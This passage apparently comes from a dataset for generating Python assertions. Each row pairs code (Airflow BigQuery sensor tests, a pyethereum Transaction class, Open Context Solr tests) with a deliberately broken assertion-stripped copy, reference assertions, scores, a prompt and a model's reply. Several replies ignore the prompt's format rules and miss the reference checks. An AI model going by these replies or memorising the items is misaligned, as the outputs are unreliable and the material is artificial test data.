60    def test_passing_arguments_to_hook(self, mock_hook):
61        task = BigQueryTablePartitionExistenceSensor(
62            task_id='task-id',
63            project_id=TEST_PROJECT_ID,
64            dataset_id=TEST_DATASET_ID,
65            table_id=TEST_TABLE_ID,
66            partition_id=TEST_PARTITION_ID,
67            gcp_conn_id=TEST_GCP_CONN_ID,
68            delegate_to=TEST_DELEGATE_TO,
69            impersonation_chain=TEST_IMPERSONATION_CHAIN,
70        )
71        mock_hook.return_value.table_partition_exists.return_value = True
72        results = task.poke(mock.MagicMock())
73
74
75            gcp_conn_id=TEST_GCP_CONN_ID,
76            delegate_to=TEST_DELEGATE_TO,
77            impersonation_chain=TEST_IMPERSONATION_CHAIN,
78        )
79            project_id=TEST_PROJECT_ID,
80            dataset_id=TEST_DATASET_ID,
81            table_id=TEST_TABLE_ID,
82            partition_id=TEST_PARTITION_ID,
83        )
84","[['results', '==', 'True'], ['results', '==', 'True']]",6,2,0.3333333333333333,0.0005768676088837,"['TEST_PROJECT_ID', 'TEST_DATASET_ID', 'TEST_TABLE_ID', 'TEST_DELEGATE_TO', 'TEST_GCP_CONN_ID', 'TEST_PARTITION_ID', 'TEST_IMPERSONATION_CHAIN', 'mock_hook', 'task', 'mock_hook.return_value.table_exists.return_value', 'results', 'mock_hook.return_value.table_partition_exists.return_value']",12,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['TEST_PROJECT_ID', 'TEST_DATASET_ID', 'TEST_TABLE_ID', 'TEST_DELEGATE_TO', 'TEST_GCP_CONN_ID', 'TEST_PARTITION_ID', 'TEST_IMPERSONATION_CHAIN', 'mock_hook', 'task', 'mock_hook.return_value.table_exists.return_value', 'results', 'mock_hook.return_value.table_partition_exists.return_value']
*Code:

1# Licensed to the Apache Software Foundation (ASF) under one
2# or more contributor license agreements.  See the NOTICE file
3# distributed with this work for additional information
4# regarding copyright ownership.  The ASF licenses this file
5# to you under the Apache License, Version 2.0 (the
6# ""License""); you may not use this file except in compliance
7# with the License.  You may obtain a copy of the License at
8#
9#   http://www.apache.org/licenses/LICENSE-2.0
10#
11# Unless required by applicable law or agreed to in writing,
12# software distributed under the License is distributed on an
13# ""AS IS"" BASIS, WITHOUT WARRANTIES OR CONDITIONS OF ANY
14# KIND, either express or implied.  See the License for the
15# specific language governing permissions and limitations
16# under the License.
17
18from unittest import TestCase, mock
19
20from airflow.providers.google.cloud.sensors.bigquery import (
21    BigQueryTableExistenceSensor,
22    BigQueryTablePartitionExistenceSensor,
23)
24
25TEST_PROJECT_ID = ""test_project""
26TEST_DATASET_ID = 'test_dataset'
27TEST_TABLE_ID = 'test_table'
28TEST_DELEGATE_TO = ""test_delegate_to""
29TEST_GCP_CONN_ID = 'test_gcp_conn_id'
30TEST_PARTITION_ID = ""20200101""
31TEST_IMPERSONATION_CHAIN = [""ACCOUNT_1"", ""ACCOUNT_2"", ""ACCOUNT_3""]
32
33
34class TestBigqueryTableExistenceSensor(TestCase):
35    @mock.patch(""airflow.providers.google.cloud.sensors.bigquery.BigQueryHook"")
36    def test_passing_arguments_to_hook(self, mock_hook):
37        task = BigQueryTableExistenceSensor(
38            task_id='task-id',
39            project_id=TEST_PROJECT_ID,
40            dataset_id=TEST_DATASET_ID,
41            table_id=TEST_TABLE_ID,
42            gcp_conn_id=TEST_GCP_CONN_ID,
43            delegate_to=TEST_DELEGATE_TO,
44            impersonation_chain=TEST_IMPERSONATION_CHAIN,
45        )
46        mock_hook.return_value.table_exists.return_value = True
47        results = task.poke(mock.MagicMock())
48
49
50            gcp_conn_id=TEST_GCP_CONN_ID,
51            delegate_to=TEST_DELEGATE_TO,
52            impersonation_chain=TEST_IMPERSONATION_CHAIN,
53        )
54            project_id=TEST_PROJECT_ID, dataset_id=TEST_DATASET_ID, table_id=TEST_TABLE_ID
55        )
56
57
58class TestBigqueryTablePartitionExistenceSensor(TestCase):
59    @mock.patch(""airflow.providers.google.cloud.sensors.bigquery.BigQueryHook"")
60    def test_passing_arguments_to_hook(self, mock_hook):
61        task = BigQueryTablePartitionExistenceSensor(
62            task_id='task-id',
63            project_id=TEST_PROJECT_ID,
64            dataset_id=TEST_DATASET_ID,
65            table_id=TEST_TABLE_ID,
66            partition_id=TEST_PARTITION_ID,
67            gcp_conn_id=TEST_GCP_CONN_ID,
68            delegate_to=TEST_DELEGATE_TO,
69            impersonation_chain=TEST_IMPERSONATION_CHAIN,
70        )
71        mock_hook.return_value.table_partition_exists.return_value = True
72        results = task.poke(mock.MagicMock())
73
74
75            gcp_conn_id=TEST_GCP_CONN_ID,
76            delegate_to=TEST_DELEGATE_TO,
77            impersonation_chain=TEST_IMPERSONATION_CHAIN,
78        )
79            project_id=TEST_PROJECT_ID,
80            dataset_id=TEST_DATASET_ID,
81            table_id=TEST_TABLE_ID,
82            partition_id=TEST_PARTITION_ID,
83        )
84",5001,"[[25, ""TEST_PROJECT_ID"", ""=="", ""test_project"", ""Assuring default project ID is the test project""],
 [26, ""TEST_DATASET_ID"", ""=="", ""test_dataset"", ""Assuring default dataset ID is the test dataset""],
 [27, ""TEST_TABLE_ID"", ""=="", ""test_table"", ""Assuring default table ID is the test table""],
 [28, ""TEST_DELEGATE_TO"", ""=="", ""test_delegate_to"", ""Assuring default delegation is to the test delegate""],
 [29, ""TEST_GCP_CONN_ID"", ""=="", ""test_gcp_conn_id"", ""Assuring default connection ID is the test connection""],
 [30, ""TEST_PARTITION_ID"", ""=="", ""20200101"", ""Assuring default partition ID is correctly set""],
 [31, ""TEST_IMPERSONATION_CHAIN"", ""=="", [""ACCOUNT_1"", ""ACCOUNT_2"", ""ACCOUNT_3""], ""Assuring default impersonation chain is correctly set""],
 [47, ""mock_hook.return_value.table_exists.return_value"", ""=="", True, ""Assuring table existence check returns true""],
 [47, ""results"", ""!="", None, ""Assuring that results are not None""],
 [72, ""mock_hook.return_value.table_partition_exists.return_value"", ""=="", True, ""Assuring table partition existence check returns true""],
 [72, ""results"", ""!="", None, ""Assuring that results are not None""]]"
inzem77/pyethereum,"from bitcoin import encode_pubkey, N, P
try:
    from ecdsa_recover import ecdsa_raw_sign, ecdsa_raw_recover
except ImportError:
    from bitcoin import ecdsa_raw_sign, ecdsa_raw_recover
import rlp
from rlp.sedes import big_endian_int, binary
from rlp.utils import decode_hex, encode_hex
from ethereum import bloom
from ethereum import utils
from ethereum.processblock import mk_contract_address, intrinsic_gas_used
from ethereum.utils import TT256
from ethereum.exceptions import InvalidTransaction
from ethereum.slogging import get_logger
log = get_logger('eth.chain.tx')

class Transaction(rlp.Serializable):

    """"""
    A transaction is stored as:
    [nonce, gasprice, startgas, to, value, data, v, r, s]

    nonce is the number of transactions already sent by that account, encoded
    in binary form (eg.  0 -> '', 7 -> '\x07', 1000 -> '\x03\xd8').

    (v,r,s) is the raw Electrum-style signature of the transaction without the
    signature made with the private key corresponding to the sending account,
    with 0 <= v <= 3. From an Electrum-style signature (65 bytes) it is
    possible to extract the public key, and thereby the address, directly.

    A valid transaction is one where:
    (i) the signature is well-formed (ie. 0 <= v <= 3, 0 <= r < P, 0 <= s < N,
        0 <= r < P - N if v >= 2), and
    (ii) the sending account has enough funds to pay the fee and the value.
    """"""

    fields = [
        ('nonce', big_endian_int),
        ('gasprice', big_endian_int),
        ('startgas', big_endian_int),
        ('to', utils.address),
        ('value', big_endian_int),
        ('data', binary),
        ('v', big_endian_int),
        ('r', big_endian_int),
        ('s', big_endian_int),
    ]

    _sender = None

    def __init__(self, nonce, gasprice, startgas, to, value, data, v=0, r=0, s=0):
        if len(to) in (40, 48):
            to = decode_hex(to)
        if len(to) == 24:
            to = utils.check_and_strip_checksum(to)
        assert len(to) == 20 or len(to) == 0
        super(Transaction, self).__init__(nonce, gasprice, startgas, to, value, data, v, r, s)
        self.logs = []

        if self.gasprice >= TT256 or self.startgas >= TT256 or \
                self.value >= TT256 or self.nonce >= TT256:
            raise InvalidTransaction(""Values way too high!"")
        if self.startgas < intrinsic_gas_used(self):
            raise InvalidTransaction(""Startgas too low"")

        log.debug('deserialized tx', tx=encode_hex(self.hash)[:8])

    @property
    def sender(self):
        if not self._sender:
            # Determine sender
            if self.v:
                if self.r >= N or self.s >= P or self.v < 27 or self.v > 28 or self.r == 0 or self.s == 0:
                    raise InvalidTransaction(""Invalid signature values!"")
                log.debug('recovering sender')
                rlpdata = rlp.encode(self, UnsignedTransaction)
                rawhash = utils.sha3(rlpdata)
                pub = ecdsa_raw_recover(rawhash, (self.v, self.r, self.s))
                if pub is False:
                    raise InvalidTransaction(""Invalid signature values (x^3+7 is non-residue)"")
                if pub == (0, 0):
                    raise InvalidTransaction(""Invalid signature (zero privkey cannot sign)"")
                pub = encode_pubkey(pub, 'bin')
                self._sender = utils.sha3(pub[1:])[-20:]
                assert self.sender == self._sender
            else:
                self._sender = 0
        return self._sender

    @sender.setter
    def sender(self, value):
        self._sender = value

    def sign(self, key):
        """"""Sign this transaction with a private key.

        A potentially already existing signature would be overridden.
        """"""
        if key in (0, '', '\x00' * 32):
            raise InvalidTransaction(""Zero privkey cannot sign"")
        rawhash = utils.sha3(rlp.encode(self, UnsignedTransaction))
        self.v, self.r, self.s = ecdsa_raw_sign(rawhash, key)
        self.sender = utils.privtoaddr(key)
        return self

    @property
    def hash(self):
        return utils.sha3(rlp.encode(self))

    def log_bloom(self):
        ""returns int""
        bloomables = [x.bloomables() for x in self.logs]
        return bloom.bloom_from_list(utils.flatten(bloomables))

    def log_bloom_b64(self):
        return bloom.b64(self.log_bloom())

    def to_dict(self):
        # TODO: previous version used printers
        d = {}
        for name, _ in self.__class__.fields:
            d[name] = getattr(self, name)
        d['sender'] = self.sender
        d['hash'] = encode_hex(self.hash)
        return d

    def log_dict(self):
        d = self.to_dict()
        d['sender'] = encode_hex(d['sender'] or '')
        d['to'] = encode_hex(d['to'])
        return d

    @property
    def creates(self):
        ""returns the address of a contract created by this tx""
        if self.to == '':
            return mk_contract_address(self.sender, self.nonce)


    def __eq__(self, other):
        return isinstance(other, self.__class__) and self.hash == other.hash

    def __hash__(self):
        return utils.big_endian_to_int(self.hash)

    def __ne__(self, other):
        return not self.__eq__(other)

    def __repr__(self):
        return '<Transaction(%s)>' % encode_hex(self.hash)[:4]

    def __structlog__(self):
        return encode_hex(self.hash)


UnsignedTransaction = Transaction.exclude(['v', 'r', 's'])


def contract(nonce, gasprice, startgas, endowment, code, v=0, r=0, s=0):
    """"""A contract is a special transaction without the `to` argument.""""""
    tx = Transaction(nonce, gasprice, startgas, '', endowment, code, v, r, s)
    return tx
","
1from bitcoin import encode_pubkey, N, P
2try:
3    from ecdsa_recover import ecdsa_raw_sign, ecdsa_raw_recover
4except ImportError:
5    from bitcoin import ecdsa_raw_sign, ecdsa_raw_recover
6import rlp
7from rlp.sedes import big_endian_int, binary
8from rlp.utils import decode_hex, encode_hex
9from ethereum import bloom
10from ethereum import utils
11from ethereum.processblock import mk_contract_address, intrinsic_gas_used
12from ethereum.utils import TT256
13from ethereum.exceptions import InvalidTransaction
14from ethereum.slogging import get_logger
15log = get_logger('eth.chain.tx')
16
17class Transaction(rlp.Serializable):
18
19    """"""
20    A transaction is stored as:
21    [nonce, gasprice, startgas, to, value, data, v, r, s]
22
23    nonce is the number of transactions already sent by that account, encoded
24    in binary form (eg.  0 -> '', 7 -> '\x07', 1000 -> '\x03\xd8').
25
26    (v,r,s) is the raw Electrum-style signature of the transaction without the
27    signature made with the private key corresponding to the sending account,
28    with 0 <= v <= 3. From an Electrum-style signature (65 bytes) it is
29    possible to extract the public key, and thereby the address, directly.
30
31    A valid transaction is one where:
32    (i) the signature is well-formed (ie. 0 <= v <= 3, 0 <= r < P, 0 <= s < N,
33        0 <= r < P - N if v >= 2), and
34    (ii) the sending account has enough funds to pay the fee and the value.
35    """"""
36
37    fields = [
38        ('nonce', big_endian_int),
39        ('gasprice', big_endian_int),
40        ('startgas', big_endian_int),
41        ('to', utils.address),
42        ('value', big_endian_int),
43        ('data', binary),
44        ('v', big_endian_int),
45        ('r', big_endian_int),
46        ('s', big_endian_int),
47    ]
48
49    _sender = None
50
51    def __init__(self, nonce, gasprice, startgas, to, value, data, v=0, r=0, s=0):
52        if len(to) in (40, 48):
53            to = decode_hex(to)
54        if len(to) == 24:
55            to = utils.check_and_strip_checksum(to)
56        super(Transaction, self).__init__(nonce, gasprice, startgas, to, value, data, v, r, s)
57        self.logs = []
58
59        if self.gasprice >= TT256 or self.startgas >= TT256 or \
60                self.value >= TT256 or self.nonce >= TT256:
61            raise InvalidTransaction(""Values way too high!"")
62        if self.startgas < intrinsic_gas_used(self):
63            raise InvalidTransaction(""Startgas too low"")
64
65        log.debug('deserialized tx', tx=encode_hex(self.hash)[:8])
66
67    @property
68    def sender(self):
69        if not self._sender:
70            # Determine sender
71            if self.v:
72                if self.r >= N or self.s >= P or self.v < 27 or self.v > 28 or self.r == 0 or self.s == 0:
73                    raise InvalidTransaction(""Invalid signature values!"")
74                log.debug('recovering sender')
75                rlpdata = rlp.encode(self, UnsignedTransaction)
76                rawhash = utils.sha3(rlpdata)
77                pub = ecdsa_raw_recover(rawhash, (self.v, self.r, self.s))
78                if pub is False:
79                    raise InvalidTransaction(""Invalid signature values (x^3+7 is non-residue)"")
80                if pub == (0, 0):
81                    raise InvalidTransaction(""Invalid signature (zero privkey cannot sign)"")
82                pub = encode_pubkey(pub, 'bin')
83                self._sender = utils.sha3(pub[1:])[-20:]
84            else:
85                self._sender = 0
86        return self._sender
87
88    @sender.setter
89    def sender(self, value):
90        self._sender = value
91
92    def sign(self, key):
93        """"""Sign this transaction with a private key.
94
95        A potentially already existing signature would be overridden.
96        """"""
97        if key in (0, '', '\x00' * 32):
98            raise InvalidTransaction(""Zero privkey cannot sign"")
99        rawhash = utils.sha3(rlp.encode(self, UnsignedTransaction))
100        self.v, self.r, self.s = ecdsa_raw_sign(rawhash, key)
101        self.sender = utils.privtoaddr(key)
102        return self
103
104    @property
105    def hash(self):
106        return utils.sha3(rlp.encode(self))
107
108    def log_bloom(self):
109        ""returns int""
110        bloomables = [x.bloomables() for x in self.logs]
111        return bloom.bloom_from_list(utils.flatten(bloomables))
112
113    def log_bloom_b64(self):
114        return bloom.b64(self.log_bloom())
115
116    def to_dict(self):
117        # TODO: previous version used printers
118        d = {}
119        for name, _ in self.__class__.fields:
120            d[name] = getattr(self, name)
121        d['sender'] = self.sender
122        d['hash'] = encode_hex(self.hash)
123        return d
124
125    def log_dict(self):
126        d = self.to_dict()
127        d['sender'] = encode_hex(d['sender'] or '')
128        d['to'] = encode_hex(d['to'])
129        return d
130
131    @property
132    def creates(self):
133        ""returns the address of a contract created by this tx""
134        if self.to == '':
135            return mk_contract_address(self.sender, self.nonce)
136
137
138    def __eq__(self, other):
139        return isinstance(other, self.__class__) and self.hash == other.hash
140
141    def __hash__(self):
142        return utils.big_endian_to_int(self.hash)
143
144    def __ne__(self, other):
145        return not self.__eq__(other)
146
147    def __repr__(self):
148        return '<Transaction(%s)>' % encode_hex(self.hash)[:4]
149
150    def __structlog__(self):
151        return encode_hex(self.hash)
152
153
154UnsignedTransaction = Transaction.exclude(['v', 'r', 's'])
155
156
157def contract(nonce, gasprice, startgas, endowment, code, v=0, r=0, s=0):
158    """"""A contract is a special transaction without the `to` argument.""""""
159    tx = Transaction(nonce, gasprice, startgas, '', endowment, code, v, r, s)
160    return tx
161","[['self.sender', '==', 'self._sender']]",2,1,0.5,0.0001753155680224,"['log', 'fields', '_sender', 'nonce', 'gasprice', 'startgas', 'to', 'value', 'data', 'v', 'r', 's', 'self.logs', 'rlpdata', 'rawhash', 'pub', 'self._sender', 'key', 'self.v', 'self.r', 'self.s', 'self.sender', 'bloomables', 'd', 'd[name]', ""d['sender']"", ""d['hash']"", ""d['to']"", 'other', 'UnsignedTransaction', 'endowment', 'code', 'tx']",33,"You are a helpful bot that adds assertions to pieces of Python code.
You will be given a list of variables and a string of code presented in the format:
*Variables:
[...]
*Code:
...
Generate assertions based on the following criteria:
1) Assert that the function can take in all inputs necessary to complete the process
2) Assert that all outputs are of the proper sizes.

Your response should ONLY be a list of assertions in the format:
[line_number, subject_variable, condition_type, target, reasoning]
 -line_number is an integer referencing the line after which the assertion should be inserted
 -subject_variable and target can ONLY be variables from the input list OR integers
 -condition_type can only be a value in this list: [==, >=, <=, !=]
 -reasoning is a short decription of why the assertion was made

Here is an example of what your input will look like and what you should return:
Example Input:
*Variables:
[n]
*Code:
1def fibonacci(n):
2   if n <= 1:
3       return n
4   else:
5       return(recur_fibo(n-1) + recur_fibo(n-2))
Example Output:
[1, n, >=, 1, ""the fibonacci sequence can only be done on posative integers""]

Which would be the same as:
1def fibonacci(n):
2   assert n >= 1
3   if n <= 1:
4       return n
5   else:
6       return(recur_fibo(n-1) + recur_fibo(n-2))


Here is the actual input you should provide assertions for:
*Variables:
['log', 'fields', '_sender', 'nonce', 'gasprice', 'startgas', 'to', 'value', 'data', 'v', 'r', 's', 'self.logs', 'rlpdata', 'rawhash', 'pub', 'self._sender', 'key', 'self.v', 'self.r', 'self.s', 'self.sender', 'bloomables', 'd', 'd[name]', ""d['sender']"", ""d['hash']"", ""d['to']"", 'other', 'UnsignedTransaction', 'endowment', 'code', 'tx']
*Code:

1from bitcoin import encode_pubkey, N, P
2try:
3    from ecdsa_recover import ecdsa_raw_sign, ecdsa_raw_recover
4except ImportError:
5    from bitcoin import ecdsa_raw_sign, ecdsa_raw_recover
6import rlp
7from rlp.sedes import big_endian_int, binary
8from rlp.utils import decode_hex, encode_hex
9from ethereum import bloom
10from ethereum import utils
11from ethereum.processblock import mk_contract_address, intrinsic_gas_used
12from ethereum.utils import TT256
13from ethereum.exceptions import InvalidTransaction
14from ethereum.slogging import get_logger
15log = get_logger('eth.chain.tx')
16
17class Transaction(rlp.Serializable):
18
19    """"""
20    A transaction is stored as:
21    [nonce, gasprice, startgas, to, value, data, v, r, s]
22
23    nonce is the number of transactions already sent by that account, encoded
24    in binary form (eg.  0 -> '', 7 -> '\x07', 1000 -> '\x03\xd8').
25
26    (v,r,s) is the raw Electrum-style signature of the transaction without the
27    signature made with the private key corresponding to the sending account,
28    with 0 <= v <= 3. From an Electrum-style signature (65 bytes) it is
29    possible to extract the public key, and thereby the address, directly.
30
31    A valid transaction is one where:
32    (i) the signature is well-formed (ie. 0 <= v <= 3, 0 <= r < P, 0 <= s < N,
33        0 <= r < P - N if v >= 2), and
34    (ii) the sending account has enough funds to pay the fee and the value.
35    """"""
36
37    fields = [
38        ('nonce', big_endian_int),
39        ('gasprice', big_endian_int),
40        ('startgas', big_endian_int),
41        ('to', utils.address),
42        ('value', big_endian_int),
43        ('data', binary),
44        ('v', big_endian_int),
45        ('r', big_endian_int),
46        ('s', big_endian_int),
47    ]
48
49    _sender = None
50
51    def __init__(self, nonce, gasprice, startgas, to, value, data, v=0, r=0, s=0):
52        if len(to) in (40, 48):
53            to = decode_hex(to)
54        if len(to) == 24:
55            to = utils.check_and_strip_checksum(to)
56        super(Transaction, self).__init__(nonce, gasprice, startgas, to, value, data, v, r, s)
57        self.logs = []
58
59        if self.gasprice >= TT256 or self.startgas >= TT256 or \
60                self.value >= TT256 or self.nonce >= TT256:
61            raise InvalidTransaction(""Values way too high!"")
62        if self.startgas < intrinsic_gas_used(self):
63            raise InvalidTransaction(""Startgas too low"")
64
65        log.debug('deserialized tx', tx=encode_hex(self.hash)[:8])
66
67    @property
68    def sender(self):
69        if not self._sender:
70            # Determine sender
71            if self.v:
72                if self.r >= N or self.s >= P or self.v < 27 or self.v > 28 or self.r == 0 or self.s == 0:
73                    raise InvalidTransaction(""Invalid signature values!"")
74                log.debug('recovering sender')
75                rlpdata = rlp.encode(self, UnsignedTransaction)
76                rawhash = utils.sha3(rlpdata)
77                pub = ecdsa_raw_recover(rawhash, (self.v, self.r, self.s))
78                if pub is False:
79                    raise InvalidTransaction(""Invalid signature values (x^3+7 is non-residue)"")
80                if pub == (0, 0):
81                    raise InvalidTransaction(""Invalid signature (zero privkey cannot sign)"")
82                pub = encode_pubkey(pub, 'bin')
83                self._sender = utils.sha3(pub[1:])[-20:]
84            else:
85                self._sender = 0
86        return self._sender
87
88    @sender.setter
89    def sender(self, value):
90        self._sender = value
91
92    def sign(self, key):
93        """"""Sign this transaction with a private key.
94
95        A potentially already existing signature would be overridden.
96        """"""
97        if key in (0, '', '\x00' * 32):
98            raise InvalidTransaction(""Zero privkey cannot sign"")
99        rawhash = utils.sha3(rlp.encode(self, UnsignedTransaction))
100        self.v, self.r, self.s = ecdsa_raw_sign(rawhash, key)
101        self.sender = utils.privtoaddr(key)
102        return self
103
104    @property
105    def hash(self):
106        return utils.sha3(rlp.encode(self))
107
108    def log_bloom(self):
109        ""returns int""
110        bloomables = [x.bloomables() for x in self.logs]
111        return bloom.bloom_from_list(utils.flatten(bloomables))
112
113    def log_bloom_b64(self):
114        return bloom.b64(self.log_bloom())
115
116    def to_dict(self):
117        # TODO: previous version used printers
118        d = {}
119        for name, _ in self.__class__.fields:
120            d[name] = getattr(self, name)
121        d['sender'] = self.sender
122        d['hash'] = encode_hex(self.hash)
123        return d
124
125    def log_dict(self):
126        d = self.to_dict()
127        d['sender'] = encode_hex(d['sender'] or '')
128        d['to'] = encode_hex(d['to'])
129        return d
130
131    @property
132    def creates(self):
133        ""returns the address of a contract created by this tx""
134        if self.to == '':
135            return mk_contract_address(self.sender, self.nonce)
136
137
138    def __eq__(self, other):
139        return isinstance(other, self.__class__) and self.hash == other.hash
140
141    def __hash__(self):
142        return utils.big_endian_to_int(self.hash)
143
144    def __ne__(self, other):
145        return not self.__eq__(other)
146
147    def __repr__(self):
148        return '<Transaction(%s)>' % encode_hex(self.hash)[:4]
149
150    def __structlog__(self):
151        return encode_hex(self.hash)
152
153
154UnsignedTransaction = Transaction.exclude(['v', 'r', 's'])
155
156
157def contract(nonce, gasprice, startgas, endowment, code, v=0, r=0, s=0):
158    """"""A contract is a special transaction without the `to` argument.""""""
159    tx = Transaction(nonce, gasprice, startgas, '', endowment, code, v, r, s)
160    return tx
161",7701,"[[51, 'nonce', '>=', 0, ""nonce cannot be negative""],
 [51, 'gasprice', '>=', 0, ""gasprice cannot be negative""],
 [51, 'startgas', '>=', 0, ""startgas cannot be negative""],
 [52, 'to', '!=', None, ""to cannot be None""],
 [52, 'value', '>=', 0, ""value cannot be negative""],
 [52, 'data', '!=', None, ""data cannot be None""],
 [71, 'self.v', '>=', 0, ""v cannot be negative""],
 [71, 'self.r', '>=', 0, ""r cannot be negative""],
 [71, 'self.s', '>=', 0, ""s cannot be negative""],
 [97, 'key', '!=', None, ""Key should not be None""],
 [132, 'self.to', '!=', None, ""to cannot be None""],
 [132, 'self.sender', '!=', None, ""sender cannot be None""],
 [157, 'endowment', '>=', 0, ""Endowment cannot be negative""],
 [157, 'code', '!=', None, ""Code cannot be None""]]"
ekansa/open-context-py,"import pytest
import logging
from opencontext_py.apps.searcher.new_solrsearcher import configs
from opencontext_py.apps.searcher.new_solrsearcher.querymaker import (
    get_identifier_query_dict,
    get_object_uri_query_dict,
)

logger = logging.getLogger(""tests-unit-logger"")


TESTS_IDS = [
    # Tuples of test cases, with input raw_identifiers and expected
    # output query_dict:
    #
    # (raw_identifier, expected_query_dict),
    #
    (None, None,),
    (
        'ark:/28722/k2g44m01s',
        {
            'fq': [
                ""((persistent_uri:ark\\:/28722/k2g44m01s) ""
                + ""OR (persistent_uri:http\\://n2t.net/ark\\:/28722/k2g44m01s) ""
                + ""OR (persistent_uri:https\\://n2t.net/ark\\:/28722/k2g44m01s))"",
            ],
        }
    ),
    (
        'ark:/28722/foo||ark:/28722/bar',
        {
            'fq': [
                ""((persistent_uri:ark\\:/28722/foo) "" 
                + ""OR (persistent_uri:ark\\:/28722/bar) "" 
                + ""OR (persistent_uri:http\\://n2t.net/ark\\:/28722/foo) ""
                + ""OR (persistent_uri:http\\://n2t.net/ark\\:/28722/bar) ""
                + ""OR (persistent_uri:https\\://n2t.net/ark\\:/28722/foo) ""
                + ""OR (persistent_uri:https\\://n2t.net/ark\\:/28722/bar))"",
            ],
        }
    ),
    (
        'slug-foo',
        {
            'fq': [
                ""((persistent_uri:slug\\-foo) "" 
                + ""OR (uuid:slug-foo) "" 
                + ""OR (slug_type_uri_label:slug_foo___*) "" 
                + ""OR (persistent_uri:http\\://orcid.org/slug\\-foo) ""
                + ""OR (persistent_uri:https\\://orcid.org/slug\\-foo) ""
                + ""OR (persistent_uri:http\\://doi.org/slug\\-foo) ""
                + ""OR (persistent_uri:https\\://doi.org/slug\\-foo) ""
                + ""OR (persistent_uri:http\\://dx.doi.org/slug\\-foo) ""
                + ""OR (persistent_uri:https\\://dx.doi.org/slug\\-foo))"",
            ],
        }
    ),
    (
        'http://opencontext.org/persons/foo',
        {
            'fq': [
                ""((uuid:foo) ""
                + ""OR (persistent_uri:http\\://opencontext.org/persons/foo) ""
                + ""OR (persistent_uri:https\\://opencontext.org/persons/foo) "" 
                + ""OR (persistent_uri:http\\://opencontext.org/persons/foo/) ""
                + ""OR (persistent_uri:https\\://opencontext.org/persons/foo/))"",
            ],
        }
    ),
]


def get_terms_set_in_filter_query(solr_fq, term="" OR ""):
    """"""Splits a solr filter query on a term""""""
    solr_fqs = solr_fq.replace(
        '(', ''
    ).replace(
        ')', ''
    ).split(term)
    return set(solr_fqs)
     

def test_get_identifier_query_dict():
    """"""Tests making a query dict for document identifiers.""""""
    for raw_identifier, expected_query_dict in TESTS_IDS:
        query_dict = get_identifier_query_dict(raw_identifier)
        if query_dict is None:
            assert query_dict == expected_query_dict
            continue
        assert get_terms_set_in_filter_query(
            query_dict['fq'][0]
        ) == get_terms_set_in_filter_query(
             expected_query_dict['fq'][0]
        )","
1import pytest
2import logging
3from opencontext_py.apps.searcher.new_solrsearcher import configs
4from opencontext_py.apps.searcher.new_solrsearcher.querymaker import (
5    get_identifier_query_dict,
6    get_object_uri_query_dict,
7)
8
9logger = logging.getLogger(""tests-unit-logger"")
10
11
12TESTS_IDS = [
13    # Tuples of test cases, with input raw_identifiers and expected
14    # output query_dict:
15    #
16    # (raw_identifier, expected_query_dict),
17    #
18    (None, None,),
19    (
20        'ark:/28722/k2g44m01s',
21        {
22            'fq': [
23                ""((persistent_uri:ark\\:/28722/k2g44m01s) ""
24                + ""OR (persistent_uri:http\\://n2t.net/ark\\:/28722/k2g44m01s) ""
25                + ""OR (persistent_uri:https\\://n2t.net/ark\\:/28722/k2g44m01s))"",
26            ],
27        }
28    ),
29    (
30        'ark:/28722/foo||ark:/28722/bar',
31        {
32            'fq': [
33                ""((persistent_uri:ark\\:/28722/foo) "" 
34                + ""OR (persistent_uri:ark\\:/28722/bar) "" 
35                + ""OR (persistent_uri:http\\://n2t.net/ark\\:/28722/foo) ""
36                + ""OR (persistent_uri:http\\://n2t.net/ark\\:/28722/bar) ""
37                + ""OR (persistent_uri:https\\://n2t.net/ark\\:/28722/foo) ""
38                + ""OR (persistent_uri:https\\://n2t.net/ark\\:/28722/bar))"",
39            ],
40        }
41    ),
42    (
43        'slug-foo',
44        {
45            'fq': [
46                ""((persistent_uri:slug\\-foo) "" 
47                + ""OR (uuid:slug-foo) "" 
48                + ""OR (slug_type_uri_label:slug_foo___*) "" 
49                + ""OR (persistent_uri:http\\://orcid.org/slug\\-foo) ""
50                + ""OR (persistent_uri:https\\://orcid.org/slug\\-foo) ""
51                + ""OR (persistent_uri:http\\://doi.org/slug\\-foo) ""
52                + ""OR (persistent_uri:https\\://doi.org/slug\\-foo) ""
53                + ""OR (persistent_uri:http\\://dx.doi.org/slug\\-foo) ""
54                + ""OR (persistent_uri:https\\://dx.doi.org/slug\\-foo))"",
55            ],
56        }
57    ),
58    (
59        'http://opencontext.org/persons/foo',
60        {
61            'fq': [
62                ""((uuid:foo) ""
63                + ""OR (persistent_uri:http\\://opencontext.org/persons/foo) ""
64                + ""OR (persistent_uri:https\\://opencontext.org/persons/foo) "" 
65                + ""OR (persistent_uri:http\\://opencontext.org/persons/foo/) ""
66                + ""OR (persistent_uri:https\\://opencontext.org/persons/foo/))"",
67            ],
68        }
69    ),
70]
71
72
73def get_terms_set_in_filter_query(solr_fq, term="" OR ""):
74    """"""Splits a solr filter query on a term""""""
75    solr_fqs = solr_fq.replace(
76        '(', ''
77    ).replace(
78        ')', ''
79    ).split(term)
80    return set(solr_fqs)
81     
82
83def test_get_identifier_query_dict():
84    """"""Tests making a query dict for document identifiers.""""""
85    for raw_identifier, expected_query_dict in TESTS_IDS:
86        query_dict = get_identifier_query_dict(raw_identifier)
87        if query_dict is None:
88            continue
89            query_dict['fq'][0]
90        ) == get_terms_set_in_filter_query(
91             expected_query_dict['fq'][0]
